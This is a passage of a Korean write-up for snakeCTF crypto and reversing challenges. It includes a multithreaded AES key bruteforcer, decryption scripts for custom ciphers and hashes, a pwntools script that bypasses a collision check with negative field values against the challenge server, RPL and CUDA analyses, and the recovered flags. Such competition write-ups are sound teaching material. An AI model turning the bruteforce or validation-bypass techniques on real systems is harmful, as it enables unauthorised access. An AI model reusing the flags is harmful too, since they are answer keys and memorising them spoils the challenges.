        for (int pos = length - 1; pos >= 0; pos--) {
            combination[pos] = charset[temp % charset_size];
            temp /= charset_size;
        }
        
        results.push_back(combination);
    }
}

// Calculate total number of combinations
size_t calculateTotalCombinations(size_t charset_size, int length) {
    size_t total = 1;
    for (int i = 0; i < length; i++) {
        total *= charset_size;
    }
    return total;
}

// Thread worker function for bruteforce
void bruteforceWorker(
    const string& charset,
    int key_length,
    size_t start_idx,
    size_t end_idx,
    const vector<uint8_t>& plaintext,
    const vector<uint8_t>& ciphertext,
    int thread_id
) {
    cout << "Thread " << thread_id << " starting: range " << start_idx << " to " << end_idx - 1 << endl;
    
    // Generate combinations for this thread's range
    vector<string> combinations;
    generateCombinationsRange(charset, key_length, start_idx, end_idx, combinations);
    
    int local_count = 0;
    
    for (const auto& key_str : combinations) {
        // Check if another thread found the key
        if (key_found.load()) {
            cout << "Thread " << thread_id << " stopping - key found by another thread" << endl;
            return;
        }
        
        // Convert string to bytes and hash to get AES key
        vector<uint8_t> keyBytes(key_str.begin(), key_str.end());
        vector<uint8_t> keyHash = sha256Hash(keyBytes);
        vector<uint8_t> aes_key(keyHash.begin(), keyHash.begin() + 16);
        
        // Try ECB encryption and compare with ciphertext
        vector<uint8_t> encrypted = aesEcbEncrypt(aes_key, plaintext);
        
        // Check if we found the correct key
        bool match = true;
        for (size_t i = 0; i < min(ciphertext.size(), encrypted.size()); i++) {
            if (ciphertext[i] != encrypted[i]) {
                match = false;
                break;
            }
        }
        
        if (match) {
            key_found.store(true);
            found_key = key_str;
            cout << "\n=== KEY FOUND ===" << endl;
            cout << "Thread " << thread_id << " found the key!" << endl;
            cout << "Key (string): " << key_str << endl;
            cout << "Key (hex): " << bytesToHex(keyBytes) << endl;
            cout << "AES key (first 16 bytes of SHA256): " << bytesToHex(aes_key) << endl;
            cout << "=================" << endl;
            return;
        }
        
        local_count++;
        
        // Update global counter and report progress
        int current = global_counter.fetch_add(1) + 1;
        if (current % REPORT_INTERVAL == 0) {
            cout << "Progress: " << current << " keys tested (Thread " << thread_id << ")" << endl;
        }
    }
    
    cout << "Thread " << thread_id << " completed: tested " << local_count << " keys" << endl;
}

int main(int argc, char* argv[]) {
    // Configuration
    const int NUM_THREADS = 8;  // Number of threads
    string charset = "abcdefghijklmnopqrstuvwxyz0123456789";
    int key_length = 5;
    
    cout << "=== AES ECB Key Bruteforce Tool ===" << endl;
    cout << "Threads: " << NUM_THREADS << endl;
    cout << "Charset: " << charset << endl;
    cout << "Key length: " << key_length << " bytes" << endl;
    
    // Get input from user
    string pt_hex, ct_hex;
    
    cout << "\nEnter plaintext (32 hex chars for 16 bytes): ";
    cin >> pt_hex;
    
    cout << "Enter ciphertext (32 hex chars for 16 bytes): ";
    cin >> ct_hex;
    
    // Parse input
    vector<uint8_t> plaintext = hexToBytes(pt_hex);
    vector<uint8_t> ciphertext = hexToBytes(ct_hex);
    
    if (plaintext.size() != 16 || ciphertext.size() != 16) {
        cerr << "Error: Both plaintext and ciphertext must be exactly 16 bytes (32 hex characters)" << endl;
        return 1;
    }
    
    cout << "\nStarting ECB bruteforce attack..." << endl;
    cout << "Plaintext:  " << pt_hex << endl;
    cout << "Ciphertext: " << ct_hex << endl;
    
    // Calculate total combinations
    size_t total_combinations = calculateTotalCombinations(charset.size(), key_length);
    cout << "Total combinations to test: " << total_combinations << endl << endl;
    
    auto start_time = chrono::high_resolution_clock::now();
    
    // Divide work among threads
    vector<thread> threads;
    size_t chunk_size = total_combinations / NUM_THREADS;
    size_t remainder = total_combinations % NUM_THREADS;
    
    size_t current_start = 0;
    for (int i = 0; i < NUM_THREADS; i++) {
        size_t current_chunk = chunk_size + (i < remainder ? 1 : 0);
        size_t current_end = current_start + current_chunk;
        
        threads.emplace_back(
            bruteforceWorker,
            charset,
            key_length,
            current_start,
            current_end,
            ref(plaintext),
            ref(ciphertext),
            i
        );
        
        current_start = current_end;
    }
    
    // Wait for all threads to complete
    for (auto& t : threads) {
        t.join();
    }
    
    auto end_time = chrono::high_resolution_clock::now();
    auto duration = chrono::duration_cast<chrono::seconds>(end_time - start_time);
    
    cout << "\n=== Results ===" << endl;
    cout << "Total keys tested: " << global_counter.load() << endl;
    cout << "Time taken: " << duration.count() << " seconds" << endl;
    
    if (key_found.load()) {
        cout << "\nSUCCESS! Key found: " << found_key << endl;
        
        // Verify the result
        vector<uint8_t> keyBytes(found_key.begin(), found_key.end());
        vector<uint8_t> keyHash = sha256Hash(keyBytes);
        vector<uint8_t> aes_key(keyHash.begin(), keyHash.begin() + 16);
        
        vector<uint8_t> verify_encrypted = aesEcbEncrypt(aes_key, plaintext);
        
        cout << "\nVerification:" << endl;
        cout << "Encrypted result: " << bytesToHex(verify_encrypted) << endl;
        cout << "Expected:         " << bytesToHex(ciphertext) << endl;
        
        if (verify_encrypted == ciphertext) {
            cout << "Status: PASSED ✓" << endl;
        } else {
            cout << "Status: FAILED ✗" << endl;
        }
    } else {
        cout << "\nKey not found. The key might not be in the charset or have different length." << endl;
    }
    
    return 0;
}
```
## scr4mbl3d

### 문제 설명

```python
#!/usr/bin/env python3

import sys
from os import path
from random import randint
from hashlib import sha256

P = 112100829556962061444927618073086278041158621998950683631735636667566868795947
ROUNDS = randint(26, 53)
CONSTANT = [(44 * i ^ 3 + 98 * i ^ 2 + 172 * i + 491) % P for i in range(ROUNDS)]
EXPONENT = 3

def split(x):
    chunk1 = x // P
    chunk2 = x % P
    return chunk1, chunk2

def merge(chunk1, chunk2):
    return chunk1 * P + chunk2

def ff(x):
    return ((x * EXPONENT) * 0x5DEECE66D) % P

def gg(x):
    digest = sha256(int(x).to_bytes(256, 'big')).digest()
    return int.from_bytes(digest, 'big') % P

def transform(x, y, i):
    u = x
    if i % 11 == 0:
        v = (y + ff(u)) % P
    else:
        v = (y + gg(u)) % P
    v = (v + CONSTANT[i]) % P
    return v, u

def encrypt(input):
    chunk1, chunk2 = split(input)
    for i in range(ROUNDS):
        if i % 5 == 0:
            chunk1, chunk2 = transform(chunk1, chunk2, i)
        else:
            chunk2, chunk1 = transform(chunk2, chunk1, i)
    output = merge(chunk1, chunk2)
    return output

if __name__ == "__main__":
    out_dir = sys.argv[1]
    flag = sys.argv[2].encode()

    input = int.from_bytes(flag)
    ciphertext = encrypt(input)

    with open(path.join(out_dir, "out.txt"), "w") as f:
        f.write(hex(ciphertext))
```

해당 코드는 랜덤으로 정해지는 `ROUNDS` 만큼 라운드를 반복하며 암호화를 수행하는 커스텀 암호입니다.

라운드별 `chunk1` 을 $L_i$, `chunk2` 를 $R_i$, `CONSTANTS` 를 $C_i$라고 정의하면 아래 수식으로 표현할 수 있습니다.

$$

F_i(x) =
\begin{cases}
\mathrm{ff}(x) & i \equiv 0 \pmod{11} \\
\mathrm{gg}(x) & \text{otherwise}
\end{cases}

$$

$$
(L_{i+1}, R_{i+1}) =
\begin{cases}
\bigl(R_i + F_i(L_i) + C_i ,\; L_i \bigr) \pmod{P} & i \equiv 0 \pmod{5} \\\bigl(R_i,\; L_i + F_i(R_i) + C_i) \pmod{P} & i \not\equiv 0 \pmod{5}
\end{cases}
$$

수식을 살펴보면 [Feistel 구조](https://ko.wikipedia.org/wiki/%ED%8C%8C%EC%9D%B4%EC%8A%A4%ED%85%94_%EC%95%94%ED%98%B8)와 유사하게 하나의 상태에만 라운드 함수를 적용하는 것을 확인할 수 있습니다.

따라서 $gg(x)$함수가 역연산이 불가능하지만 해당 암호의 복호화가 가능합니다.

라운드 복호화 수식은 다음과 같습니다.

$$
(L_i, R_i) =\begin{cases}\bigl(R_{i+1},\; L_{i+1} - F_i(R_{i+1}) - C_i \bigr) \pmod{P} & i \equiv 0 \pmod{5} \\[8pt]\bigl(R_{i+1} - F_i(L_{i+1}) - C_i,\; L_{i+1}\bigr) \pmod{P}& i \not\equiv 0 \pmod{5}\end{cases}
$$

이때 `ROUNDS` 를 모르지만 $[26, 53]$ 범위이기 때문에 브루트포싱이 가능합니다.

### 풀이 코드

```python
from Crypto.Util.number import *
from source import *

ciphertext = 0xdaf6cddc56d4e9606730439fcd856a76426ac54acb1a11eb283d082460744ca75c161e238d8641a56ae3fd027601b297784f1761cb47776989d9c96032640b12

def F(i: int, u: int) -> int:
    if i % 11 == 0:
        return ff(u)
    else:
        return gg(u)

def decrypt(ciphertext: int) -> int:
    L, R = split(ciphertext)
    for i in range(ROUNDS - 1, -1, -1):
        if i % 5 == 0:
            L, R = R, (L - F(i,R) - CONSTANT[i]) % P
        else:
            L, R = (R - F(i,L) - CONSTANT[i]) % P, L
    return merge(L, R)

for ROUNDS in range(26, 54):
  CONSTANT = [(44 * i ^ 3 + 98 * i ^ 2 + 172 * i + 491) % P for i in range(ROUNDS)]
  flag = long_to_bytes(decrypt(ciphertext))
  if b"snakeCTF{" in flag:
      print(flag)
      break
```

```
snakeCTF{Ev3ry7hing_1s_34s13r_w1th_F3is7el_b956fb75309cb842}
```

## unf33dme

### 문제 설명

```python
#!/usr/bin/env sage

import sys
from os import path

from Crypto.Hash import SHAKE256
from Crypto.Util.Padding import pad
from Crypto.Util.number import bytes_to_long

class Babylon:
    def __init__(self):
        self.setParams()
        self.genConstants()

    def setParams(self):
        self.exp = 3
        self.p = 65537
        self.nbytes = self.p.bit_length() // 8
        self.F = GF(self.p)
        self.state_size = 24
        self.rounds = 3

    def genConstants(self):
        shake = SHAKE256.new()
        shake.update(b"SNAKECTF")
        self.constants = []
        for _ in range(self.rounds):
            self.constants.append(self.F(int.from_bytes(shake.read(self.nbytes), 'big')))

    def decompose(self, message):
        state = []
        padded_message = pad(message, self.state_size * self.nbytes)
        for i in range(0, len(padded_message), self.nbytes):
            chunk = bytes_to_long(padded_message[i:i + self.nbytes])
            state.append(chunk)
        return state

    def random(self):
        return [self.F.random_element() for _ in range(self.state_size)]

    def shuffle(self, state):
        for i in range(0, self.state_size, 2):
            t = state[i]
            state[i] = state[i + 1]
            state[i + 1] = t
        return state

    def add(self, state, constant):
        return [state[i] + constant for i in range(self.state_size)]

    def xor(self, a, b):
        return [a[i] + b[i] for i in range(self.state_size)]

    def sbox(self, state):
        return [(state[i]) ^ self.exp for i in range(self.state_size)]

    def round(self, state, r):
        state = self.sbox(state)
        state = self.add(state, self.constants[r])
        return state

    def permute(self, state, key):
        state = self.xor(state, key)
        for r in range(self.rounds):
            state = self.round(state, r)
        return state

    def hash(self, message):
        input = self.decompose(message)
        IV = self.random()
        output = self.permute(input, IV)
        digest = self.xor(output, self.shuffle(input))
        return digest, IV

if __name__ == "__main__":
    out_dir = sys.argv[1]
    flag = sys.argv[2].encode()

    babylon = Babylon()
    assert len(flag) < babylon.state_size * babylon.nbytes, len(flag)

    digest, IV = babylon.hash(flag)

    with open(path.join(out_dir, "out.txt"), "w") as f:
        f.write(f"{digest}\n{IV}")
```

해당 코드는 $\mathbb{F}_p$에서 동작하는 3라운드 블록 암호 기반의 해시 함수입니다.

3라운드 동작 전체를 $F(x)$, `genConstants`를 통해 생성되는 3개의 상수들을 $c_0, c_1, c_2$라고 정의하면 아래 수식으로 표현할 수 있습니다.

$$
F(x) = ( (x^3 + c_0)^3 + c_1 )^3 + c_2\pmod{p}
$$

사용자 입력을 $x$라고 정의하면 `hash` 함수 전체의 동작은 아래 수식으로 표현할 수 있습니다.

$$
\text{digest}_{2k}   = F(x_{2k}+\text{IV}_{2k}) + x_{2k+1} \\ \text{digest}_{2k+1} = F(x_{2k+1}+\text{IV}_{2k+1}) + x_{2k}  
$$

이때, $\mathbb{F}_p$의 곱셈군의 order인 $|\mathbb{F}_p^*|$가 $65536$이고, $\text{gcd}(3, 65536) = 1$이므로 $x \rightarrow x^3$는 전단사 함수입니다.

따라서 $F$함수의 역함수 $F^{-1}$을 계산할 수 있습니다.

복호화 로직은 한 쌍$(x_0, x_1)$에 대해 아래 수식으로 표현할 수 있습니다.

$$
\begin{cases}
\text{digest}_0 = F(x_0+\text{IV}_0) + x_1 \\
\text{digest}_1 = F(x_1+\text{IV}_1) + x_0
\end{cases}
$$

$$
x_0 = F^{-1}(\text{digest}_0 - x_1) - \text{IV}_0
$$

이때 $x_1$은 최대 2바이트($[0, 65535]$) 이므로 브루트포싱을 통해 $(x_0, x_1)$ 쌍들을 구할 수 있습니다.

복호화 식을 통해 구한 $(x_0, x_1)$을 2번째 식에 넣어 입력값을 검증할 수 있습니다.

총 state의 개수는 24개이므로 12개 쌍에 대해 65535번 브루트포싱을 하여 플래그 후보들을 만들어서 문제를 해결할 수 있습니다.

### 풀이 코드

```python
from hashlib import shake_256
from itertools import product
from Crypto.Util.Padding import unpad

p = 65537
STATE_SIZE = 24
ROUNDS = 3
nbytes = 2
E_INV = pow(3, -1, p-1)

def gen_constants():
    s = shake_256(b"SNAKECTF").digest(ROUNDS * nbytes)
    return [int.from_bytes(s[i*nbytes:(i+1)*nbytes], "big") % p for i in range(ROUNDS)]

c = gen_constants()

def F(x):
    for ci in c:
        x = (pow(x, 3, p) + ci) % p
    return x

def Finv(y):
    for ci in reversed(c):
        y = pow(y-ci, E_INV, p)
    return y

def recover_pair(digest_0, digest_1, IV_0, IV_1):
    sols = []
    for x1 in range(65535):
        x0 = (Finv(digest_0 - x1) - IV_0) % p
        if F(x1 + IV_1) == (digest_1 - x0) % p:
            sols.append((x0, x1))
    return sols

def compress(xs):
    return b"".join(int(v).to_bytes(nbytes, "big") for v in xs)

def dehash(digest, IV):
    pair_solutions = []
    for k in range(0, STATE_SIZE, 2):
        sols = recover_pair(digest[k], digest[k+1], IV[k], IV[k+1])
        pair_solutions.append(sols)

    results = []
    for combo in product(*pair_solutions):
        flat = []
        for (a, b) in combo:
            flat.extend([a, b])
        try:
            padded = compress(flat, nbytes)
            msg = unpad(padded, STATE_SIZE * nbytes)
            text = msg.decode("utf-8")
        except Exception:
            continue
        results.append(text)
    return results

digest = [60407, 954, 61745, 31427, 44744, 24985, 27958, 21724, 22225, 23543, 54936, 16506, 32976, 3647, 46427, 51196, 11423, 61644, 21053, 16157, 38253, 27340, 61590, 24249]
IV = [17473, 38743, 10156, 9656, 49729, 63528, 58928, 31692, 17092, 7959, 44354, 21143, 13559, 48875, 47831, 55499, 59187, 20230, 62783, 51226, 3212, 62962, 64153, 54345]

flag_candidates = dehash(digest, IV)
for flag in flag_candidates:
    if b"snakeCTF{" in flag:
        print(flag)
```

```python
snakeCTF{p0lys_4r3_m4g1c_:)_590292a136e378da}
```

## Free Start

### 문제 설명

```python
#!/usr/bin/env sage
from Anemoi_primitive.anemoi import *
from copy import deepcopy
import os
import signal
from random import randint

TIMEOUT = 200
FLAG = os.getenv("FLAG", "FLAG{this_is_a_fake_flag_for_testing_purposes}")
PRIME = 280989701

# SPONGE
class SPONGE:
    def __init__(self, prime):
        self.prime = prime
        self.n_bits_per_block = len(bin(prime)[2:]) - 1
        # Anemoi params
        self.l = 1
        self.alpha = 3
        self.n_rounds = 21

    def hash(self, message, initial_c):
        assert initial_c < self.prime
        # ABSORBING PHASE
        state = [[0], [initial_c]]
        for b in message:
            state[0][0] = (state[0][0] + b) % self.prime
            temp = deepcopy(state)
            permutation = ANEMOI(self.prime, self.alpha, self.n_rounds, self.l)
            state = permutation(temp[0], temp[1])
        return state[0][0]

# SERVICE
TEST = 100

def main():
    S = SPONGE(PRIME)
    print("For each of the given messages, you must give me a collision. Let's start!")
    # create message
    print(
        "The messages should be represented as a list of values comma separated such as 2, 3, 4, 5, 6"
    )
    while True:
        print(
            """ 
        MENU:
            1) Play
            2) Exit
            """
        )
        choice = input("> ")
        if choice == "1":
            passed_tests = 0
            while passed_tests < TEST:
                message = [randint(0, PRIME - 1) for _ in range(5)]
                initial_capacity = randint(0, PRIME - 1)
                print(f"The chosen message is: {message}")
                print(f"The initial capacity is: {initial_capacity}")
                hash_value = S.hash(message, initial_capacity)
                print(f"The corresponding hash value is {hash_value}")
                solvable = int(input("Is there solution? (0 means NO, 1 means YES): "))
                if solvable == 0:
                    continue
                elif solvable > 1:
                    break
                input_message = list(
                    map(int, input("Give me your message: ").strip().split(","))
                )
                if len(input_message) < 2:
                    print("Your message must have at least two blocks")
                    break
                if not all([v < PRIME for v in input_message]):
                    print("Your message must be composed of values in the field!")
                    break
                if "|".join(map(str, input_message)) in "|".join(map(str, message)):
                    print("Your message cannot contains subsequences of my message!")
                    break
                input_initial_capacity = int(input("Give me your initial capacity: "))
                your_hash_value = S.hash(input_message, input_initial_capacity)
                if your_hash_value != hash_value:
                    print("The hashes do not match!")
                    break
                else:
                    print("Congratulations!")
                    passed_tests += 1
            if passed_tests == TEST:
                print(f"Congratulations! Here is the flag: {FLAG}")
        elif choice == "2":
            break

if __name__ == "__main__":
    signal.alarm(TIMEOUT)
    main()

```

해당 코드는 $\mathbb{F}_p$ 위에서 동작하고, [Anemoi](https://github.com/anemoi-hash/anemoi-hash)를 내부 순열로 사용하는 `SPONGE` 해시 함수입니다.

총 100번 해시 충돌을 만들면 플래그를 제공합니다.

```python
if not all([v < PRIME for v in input_message]):
    print("Your message must be composed of values in the field!")
    break
if "|".join(map(str, input_message)) in "|".join(map(str, message)):
    print("Your message cannot contains subsequences of my message!")
    break
```

하지만 해당 코드에서 `v`값이 음수인지에 대한 검증을 하지 않습니다.

이때 `SPONGE` 해시는 $F_p$위에서 동작하기 때문에 아래 수식과 같이 음수를 넣어 입력값과 해시값이 동일한지 비교하는 로직을 bypass할 수 있습니다.

$$
M = (m_1, m_2, m_3, m_4, m_5), \quad m_i \in \mathbb{F}_p
$$

$$
\tilde{M} = (m_1 - p, \; m_2 - p, \; m_3 - p, \; m_4 - p, \; m_5 - p).
$$

$$
m_i - p \equiv m_i \pmod{p}.
$$

### 풀이 코드

```python
from pwn import *
import ast

p = 280989701

def forge(msg):
    return [m - p for m in msg]

def solve():
  io.recvuntil(b": ")
  msg = list(ast.literal_eval(io.recvline(keepends=False).decode()))
  
  io.recvuntil(b": ")
  cap = int(io.recvline(keepends=False).decode())
  
  io.recvline()

  io.sendlineafter(b": ", b"1")

  fmsg = forge(msg)
  io.sendlineafter(b": ", (",").join(str(x) for x in fmsg).encode())

  io.sendlineafter(b": ", str(cap).encode())

  out = io.recvline()

io = remote("freestart.challs.snakectf.org", 1337, ssl=True)

# Submit team token
io.sendlineafter(b": ", b"[**REDACTED**]")
io.recvline()

# POW
print(io.recvline(keepends=False).decode())
io.sendlineafter(b":", input().encode())

# Make hash collision
io.recvuntil(b"> ")
io.sendline(b"1")

for _ in range(100):
  solve()

io.interactive()
```

```python
snakeCTF{resultant_computation_can_help_a_lot_if_some_roots_are_easy_to_find_b99aa018075c349b}
```


# REV
# Saturn

다음과 같은 txt 문제 파일이 주어진다.

```txt
We are proud to present you the CHKFLG program for the HP 28s programmable calculator.
Press the following buttons on an HP 28s ROM rev. 2BB to load the CHKFLG utility:

« "Wrong Flag" SWAP 1 5 FOR I DUP I I SUB NUM DUP DUP 97 ≥ SWAP 122 ≤ AND NOT IF THEN ABORT END 32 - CHR "SNAKE" I I SUB ≠ IF THEN ABORT END NEXT DUP 6 9 SUB "CTF{" ≠ IF THEN ABORT END DUP DUP SIZE DUP SUB "}" ≠ IF THEN ABORT END DUP SIZE 37 ≥ IF THEN ABORT END DUP SIZE 1 - 10 SWAP SUB DUP DUP SIZE 13 SWAP SUB 'TFA' STO DUP 1 12 SUB 'ENC' STO TFA " " POS 0 ≠ IF THEN ABORT END IFERR DOPATH RCL THEN DROP ERRN ERRM SWAP DROP END "" 1 TFA SIZE FOR I TFA I I SUB DUP ERRN B→R 481 - CHR == IF THEN DROP " " END + NEXT ≠ IF THEN ABORT END 1 ENC SIZE FOR I ENC I I SUB NUM DUP 65 ≥ SWAP 90 ≤ AND NOT IF THEN ABORT END NEXT ENC 'S' STO "" 'R' STO S SIZE 1 SWAP FOR I S I DUP SUB NUM 3 - 26 MOD "A" NUM + CHR R SWAP + 'R' STO NEXT R IFERR "aigjbospgf" 9683 + THEN DROP DROP ERRM DUP END DROP 5 17 SUB 'D' STO "" 1 D SIZE FOR I D I I SUB DUP NUM 32 == IF THEN DROP ELSE + END NEXT 'SA' STO "" 'RA' STO 1 SA SIZE FOR I RA SA I I SUB NUM DUP 97 ≥ DUP 122 ≤ AND IF THEN 32 - END CHR + 'RA' STO NEXT RA ≠ IF THEN ABORT END DROP DROP "FLAG CORRECT" »
'CHKFLG'
STO

The CHKFLG utility can be used as following:
"snakeCTF{insert_flag_here}"
CHKFLG

Upon entering the correct flag, the utlity will push "FLAG CORRECT" to the stack.
```

보기 쉽게 나타낸다면 아래와 같다.

```rpl
«
  "Wrong Flag" SWAP                           @ ABORT 시 메시지
  1 5 FOR I                                   @ 1~5 글자 검사
    DUP I I SUB NUM                           @ 한 글자 코드
    DUP DUP 97 ≥ SWAP 122 ≤ AND NOT           @ 소문자 a..z 아니면
    IF THEN ABORT END
    32 - CHR                                  @ 소문자 → 대문자
    "SNAKE" I I SUB ≠ IF THEN ABORT END       @ 'SNAKE'와 대조(대소문자 무시)
  NEXT

  DUP 6 9 SUB "CTF{" ≠ IF THEN ABORT END      @ 6~9: CTF{
  DUP DUP SIZE DUP SUB "}" ≠ IF THEN ABORT END @ 마지막: }
  DUP SIZE 37 ≥ IF THEN ABORT END             @ 전체 길이 < 37

  DUP SIZE 1 - 10 SWAP SUB                    @ inner = 10..(len-1)
  DUP DUP SIZE 13 SWAP SUB 'TFA' STO          @ TFA = inner[13..end]
  DUP 1 12 SUB 'ENC' STO                      @ ENC = inner[1..12]
  TFA " " POS 0 ≠ IF THEN ABORT END           @ TFA에 스페이스 금지

  IFERR DOPATH RCL                            @ 에러 유도(1) → ERRN/ERRM 기준 확보
  THEN
    DROP                                      @ 에러 객체 등 제거
    ERRN ERRM SWAP DROP                       @ 스택엔 ERRM만 남게 정리(=비교 기준)
  END

  "" 1 TFA SIZE FOR I                         @ TFA의 특정문자를 공백으로 치환해 누적
    TFA I I SUB
    DUP ERRN B→R 481 - CHR ==                 @ CHR(ERRN-481)이면
    IF THEN DROP " " END                      @ 공백으로 대체
    +
  NEXT
  ≠ IF THEN ABORT END                         @ 치환 결과 ≠ ERRM → 실패

  1 ENC SIZE FOR I                            @ ENC는 전부 A..Z
    ENC I I SUB NUM
    DUP 65 ≥ SWAP 90 ≤ AND NOT IF THEN ABORT END
  NEXT

  ENC 'S' STO
  "" 'R' STO
  S SIZE 1 SWAP FOR I                         @ R = ROT(+10)(ENC)
    S I DUP SUB NUM 3 - 26 MOD "A" NUM + CHR  @ (NUM-3)%26 + 'A' → 사실상 +10
    R SWAP + 'R' STO
  NEXT

  R                                          @ 스택에 R를 올려둔 상태에서…
  IFERR "aigjbospgf" 9683 +                  @ 에러 유도(2) → "Bad Argument Type"
  THEN
    DROP DROP                                 @ 불필요 객체 제거(스택 정리)
    ERRM DUP                                   @ ERRM 두 장 복제
  END
  DROP 5 17 SUB 'D' STO                       @ D = ERRM[5..17] = "Argument Type"

  "" 1 D SIZE FOR I                           @ SA = D에서 공백 제거
    D I I SUB DUP NUM 32 == IF THEN DROP ELSE + END
  NEXT 'SA' STO

  "" 'RA' STO                                  @ RA = SA의 소문자를 대문자로
  1 SA SIZE FOR I
    RA SA I I SUB NUM DUP 97 ≥ DUP 122 ≤ AND IF THEN 32 - END
    CHR + 'RA' STO
  NEXT

  RA ≠ IF THEN ABORT END                      @ (스택의) R와 RA 비교
  DROP DROP                                    @ 정리
  "FLAG CORRECT"
»
'CHKFLG' STO
```

로직을 분석해보자면, 
1. 앞 5글자를 대문자로 바꿔서 SNAKE와 비교.
2. 6~9글자가 `CTF{`, 마지막은 `}`, 전체 길이 < 37
3. 내부 본문은 `[9:-2]`, ENC는 앞 12글자, TFA는 나머지
4. ENC는 대문자(A-Z) 가능, TFA는 공백 X
5. ERRN은 에러 번호, ERRM은 에러 메세지
6. 고의로 에러를 발생시킴. `DOPATH RCL`
7. 이 상황에서 보통 **ERRM = "Undefined Name", ERRN = 516**로 알려져 있고 ERRM의 공백을 ERRN-481로 바꿔치기 하므로, ERRN-481 = 35 = '#' => `"Undefined#Name"`
8. 고의로 에러를 발생시킴. `"aigjbospgf" 9683 +` -> 타입 불일치 -> `ERRM = "Bad Argument Type"`
9. `D = "Argument Type"` -> 공백 제거 -> 대문자로 치환 -> `RA = "ARGUMENTTYPE"`
10. R은 ENC 각 대문자에 대해서 +10 시저 변환이 됨. 프로그램은 RA==R이여야 하므로 ENC는 RA에 대해 -10 시저 변환을 하면 됨. -> `ENC = "QHWKCUDJJOFU"`

## FLAG

Flag: `snakeCTF{QHWKCUDJJOFUUndefined#Name}`

# Parallel Flagging

주어진 파일은 ELF 64bit executable 파일인 chall, 그리고 역산해야하는 결과인 output.txt 파일이다. 

chall 파일은 CUDA C++로 작성된 파일이다. output.txt는 hex char 두개(1바이트)를 띄어쓰기로 묶어 출력된 파일이다. chall 파일에서 결과를 그렇게 출력한다.

CUDA C++를 분석할 수 있는 cuobjdump라는 툴이 있다.   
`conda install nvidia::cuda-cuobjdump`를 통해 다운 받아준다.

IDA로 Main 함수를 본다면 특별한 연산은 안 보이고 `kernel(sd, keyd1);`에서 중요한 것이 일어나는 것을 예측할 수 있다.

kernel 소스코드를 알기위해 바이너리에서 추출한 PTX가 필요하다.   
다음과 같이 얻을 수 있다.
```
➜  parallel-flagging cuobjdump --dump-ptx chall

Fatbin elf code:
================
arch = sm_52
code version = [1,7]
host = linux
compile_size = 64bit

Fatbin elf code:
================
arch = sm_52
code version = [1,7]
host = linux
compile_size = 64bit

Fatbin ptx code:
================
arch = sm_52
code version = [8,3]
host = linux
compile_size = 64bit
compressed








.version 8.3
.target sm_52
.address_size 64


.const .align 4 .b8 scramble_map[128] = {15, 0, 0, 0, 21, 0, 0, 0, 2, 0, 0, 0, 18, 0, 0, 0, 6, 0, 0, 0, 27, 0, 0, 0, 7, 0, 0, 0, 17, 0, 0, 0, 13, 0, 0, 0, 24, 0, 0, 0, 26, 0, 0, 0, 4, 0, 0, 0, 29, 0, 0, 0, 16, 0, 0, 0, 20, 0, 0, 0, 5, 0, 0, 0, 22, 0, 0, 0, 31, 0, 0, 0, 11, 0, 0, 0, 10, 0, 0, 0, 12, 0, 0, 0, 28, 0, 0, 0, 3, 0, 0, 0, 19, 0, 0, 0, 14, 0, 0, 0, 30, 0, 0, 0, 8, 0, 0, 0, 25, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 23, 0, 0, 0, 9};



.visible .entry _Z6kernelPcS_(
.param .u64 _Z6kernelPcS__param_0,
.param .u64 _Z6kernelPcS__param_1
)
{
.reg .b16 %rs<6>;
.reg .b32 %r<22>;
.reg .b64 %rd<12>;

    .shared .align 1 .b8 _ZZ6kernelPcS_E10sharedData[32];

    .shared .align 1 .b8 _ZZ6kernelPcS_E9scrambled[32];

ld.param.u64 %rd1, [_Z6kernelPcS__param_0];
ld.param.u64 %rd2, [_Z6kernelPcS__param_1];
cvta.to.global.u64 %rd3, %rd2;
cvta.to.global.u64 %rd4, %rd1;
mov.u32 %r1, %ctaid.x;
mov.u32 %r2, %ntid.x;
mov.u32 %r3, %ctaid.y;
mov.u32 %r4, %nctaid.x;
mad.lo.s32 %r5, %r3, %r4, %r1;
mov.u32 %r6, %ctaid.z;
mul.lo.s32 %r7, %r6, %r4;
mov.u32 %r8, %nctaid.y;
mad.lo.s32 %r9, %r7, %r8, %r5;
mov.u32 %r10, %tid.x;
mad.lo.s32 %r11, %r9, %r2, %r10;
cvt.s64.s32 %rd5, %r11;
add.s64 %rd6, %rd4, %rd5;
ld.global.u8 %rs1, [%rd6];
mov.u32 %r12, _ZZ6kernelPcS_E10sharedData;
add.s32 %r13, %r12, %r10;
xor.b32 %r14, %r9, 1;
add.s32 %r15, %r9, %r10;
sub.s32 %r16, %r15, %r14;
and.b32 %r17, %r16, 7;
cvt.u64.u32 %rd7, %r17;
add.s64 %rd8, %rd3, %rd7;
ld.global.u8 %rs2, [%rd8];
xor.b16 %rs3, %rs1, %rs2;
st.shared.u8 [%r13], %rs3;
bar.sync 0;
mul.wide.u32 %rd9, %r10, 4;
mov.u64 %rd10, scramble_map;
add.s64 %rd11, %rd10, %rd9;
ld.const.u32 %r18, [%rd11];
add.s32 %r19, %r12, %r18;
ld.shared.u8 %rs4, [%r19];
mov.u32 %r20, _ZZ6kernelPcS_E9scrambled;
add.s32 %r21, %r20, %r10;
st.shared.u8 [%r21], %rs4;
bar.sync 0;
ld.shared.u8 %rs5, [%r21];
st.global.u8 [%rd6], %rs5;
ret;

}
```

로직을 Python 으로 표현하면 아래와 같다.
```py
scramble_map = [15,21,2,18,6,27,7,17,13,24,26,4,29,16,20,5,22,31,11,10,12,28,3,19,14,30,8,25,1,0,23,9]

def encrypt_cuda_like(data: bytes, key: bytes) -> bytes:
    if len(data) > 256: raise ValueError("len(data) must be <= 256")
    if len(key) < 8: raise ValueError("len(key) must be >= 8")
    data = data + b'-' * (256 - len(data))
    key8 = key[:8]
    out = bytearray(256)
    for block in range(4):
        base = block * 32
        delta = -1 if (block % 2 == 0) else 1
        for t in range(32):
            s = scramble_map[t]
            out[base + t] = data[base + s] ^ key8[(s + delta) & 7]
    out[128:256] = data[128:256]
    return bytes(out)

def to_hex_line(b: bytes) -> str:
    return " ".join(f"{x:02x}" for x in b)
```

`kernel(sd, keyd1)`에서 key는 환경변수에서 가져온다. 'thisisak'를 사용한다면 이상한 결과가 나와서 추가 아이디어가 필요하다.   
이때 flag Format을 사용할 수 있다.

`snakeCTF{`를 통해서 8바이트 key를 알아내고, 역연산을 해주면 된다. `-`는 제외한다.

## solve.py
```py
inv_map = [29,28,2,22,11,15,4,6,26,31,19,18,20,8,24,0,
           13,7,3,23,14,1,16,30,9,27,10,5,21,12,25,17]

def inv(out_bytes: bytes, key: bytes) -> bytes:
